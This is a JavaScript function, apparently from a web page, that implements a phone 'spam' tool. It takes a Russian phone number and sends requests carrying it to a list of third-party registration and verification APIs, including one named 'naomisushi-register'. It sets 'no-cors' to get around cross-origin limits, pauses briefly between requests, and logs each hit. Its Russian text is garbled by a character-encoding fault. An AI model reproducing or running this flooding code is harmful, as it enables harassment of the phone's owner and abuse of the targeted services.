    async function startSpam() {
        const phone = document.getElementById("phone").value.trim();
        if (!phone || !/^\+7\d{10}$/.test(phone)) {
            alert("–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –≤ —Ñ–æ—Ä–º–∞—Ç–µ +79991234567");
            return;
        }

        const log = document.getElementById("log");
        const btn = document.getElementById("sendBtn");
        btn.disabled = true;
        btn.textContent = "–û—Ç–ø—Ä–∞–≤–∫–∞...";

        log.textContent = "–ù–∞—á–∏–Ω–∞–µ–º –æ—Ç–ø—Ä–∞–≤–∫—É...\n";

        for (const api of apis()) {
            try {
                const isGet = api.method === "GET";
                const url = isGet ? api.url + api.bodyT(phone) : api.url;
                const init = {
                    method: api.method,
                    mode: "no-cors", // –û–±—Ö–æ–¥ CORS, –Ω–æ –±–µ–∑ –æ—Ç–≤–µ—Ç–∞
                    credentials: "omit",
                    headers: api.headers
                };
                if (!isGet) {
                    init.body = api.name === "naomisushi-register" ? api.bodyT(phone, "") : api.bodyT(phone);
                }

                await fetch(url, init);
                log.textContent += `‚úÖ ${api.name}\n`;
                // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –∑–∞–ø—Ä–æ—Å–∞–º–∏ (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
                await new Promise(r => setTimeout(r, 100));
            } catch (e) {
                log.textContent += `‚ùå ${api.name}\n`;
            }
        }

        btn.disabled = false;
        btn.textContent = "–û—Ç–ø—Ä–∞–≤–∏—Ç—å –µ—â—ë —Ä–∞–∑";
        log.textContent += "\n–ì–æ—Ç–æ–≤–æ.";
